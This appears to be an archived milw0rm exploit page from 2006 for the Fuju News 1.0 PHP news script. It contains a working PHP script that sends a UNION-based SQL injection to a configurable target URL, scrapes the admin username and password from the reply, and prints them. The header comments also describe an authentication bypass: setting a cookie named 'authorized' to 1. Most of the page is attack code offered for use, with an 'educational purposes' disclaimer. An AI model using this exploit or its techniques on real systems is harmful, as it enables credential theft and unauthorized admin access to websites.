<html><head><title>Fuju News 1.0 Authentication Bypass / Remote SQL Injection Exploit</title></head><pre>&lt;?php /*

 |---==============================================================---|
 |                          /\¯\__       /\¯\                         |   
 |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |    
 |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |    
 |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |     
 |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |      
 |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |     
 |                                     &gt;&gt; Internet Security           |                         
 |---==============================================================---|
 
        title: fuju news 1.0 remote sql injection
      release: 2006-04-16
       author: snatcher [snatcher at gmx.ch]
      country: switzerland  |+|
	  
  application: Fuju News 1.0
  description: a php / mysql based newsscript
     download: http://www.clanscripte.net/main.php?content=download&amp;do=file&amp;dlid=243
  description: you can get the password with a simple sql injection.
       greets: honkey, str0ke &lt;- good exploit publisher :),
			   all security guys and coders over the world
 terms of use: this exploit is just for educational purposes, do not use it for illegal acts.


---------------------------- archiv2.php - line 25 --------------------------------------
$result1 =@mysql_query(&quot;SELECT * FROM news_sql WHERE ID LIKE $ID&quot;);
-----------------------------------------------------------------------------------------

because this $ID isn't escaped correctly you can insert malicious sql code,
i.e. with a union operator.


title: fuju news 1.0 restriction bypass

------------------------- edit_kategorie.php - line 19 ----------------------------------
$authorized=$HTTP_COOKIE_VARS['authorized'];
-----------------------------------------------------------------------------------------

that's the mistake of the code. you only have to create a session cookie named 'authorized'
with the value 1, and you are logged in.

*/
/*********************** CONFIGURATION ****************************/

$PATH_TO_FILE  = 'http://yourhost.com/fuju/archiv2.php';           // in example: http://yourhost.com/fuju/archiv2.php
$TABLE_PREFIX  = '';                                               // default: empty
$GET_VARS      = '?ID=';                                           // do not change
$SQL_INJECTION = '-666 union select pw,0,0,benutzer,0,0,pw from '. // do not change
                 $TABLE_PREFIX.'admin_sql /*';


/**************************** MAIN ********************************/

$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!'); 
foreach ($file_array as $now)                               
	$html_content .= $now;

$html_content = str_castrate($html_content);

preg_match_all(&quot;!Autor:&lt;/span&gt;&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;trbordercolorlight='#2E2E2E'bordercolordark='#848484'&gt;&quot;.
               &quot;&lt;tdalign=leftvalign=topbgcolor=\&quot;#49535C\&quot;&gt;&lt;divalign='center'&gt;&lt;spanclass='Stil2'&gt;(.*?)&lt;/div&gt;!&quot;,
			   $html_content,$username); /* gets username */
preg_match_all(&quot;!Kategorie:&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;trbordercolorlight='#2E2E2E'bordercolordark=&quot;.
               &quot;'#848484'&gt;&lt;tdalign=leftvalign=topbgcolor=\&quot;#49535C\&quot;&gt;&lt;divalign='center'&gt;&lt;fontclass=\&quot;content\&quot;&quot;.
			   &quot;&gt;&lt;spanclass='Stil2'&gt;(.*?)&lt;/span&gt;!&quot;, 
                $html_content,$password); /* gets password */

if ($username[1][0] &amp;&amp; $password[1][0]) {
	echo 'username: &lt;b&gt;'.$username[1][0].'&lt;/b&gt;&lt;br&gt;';
	echo 'password: &lt;b&gt;'.$password[1][0].'&lt;/b&gt;';
}else {
	echo 'exploit failed! &lt;br&gt;';
}
echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
======================================================================&lt;br&gt;
exploit: fuju news 1.0 remote sql injection&lt;br&gt;
release: 2006-04-16&lt;br&gt;
author: snatcher [snatcher at gmx.ch]&lt;br&gt;
======================================================================';

function str_castrate($string) {
	$string = str_replace(&quot;\n&quot;, '', $string);
	$string = str_replace(&quot;\r&quot;, '', $string);
	$string = str_replace(&quot; &quot;, '', $string);
	return $string;
}
?&gt;

# milw0rm.com [2006-04-16]</pre></html>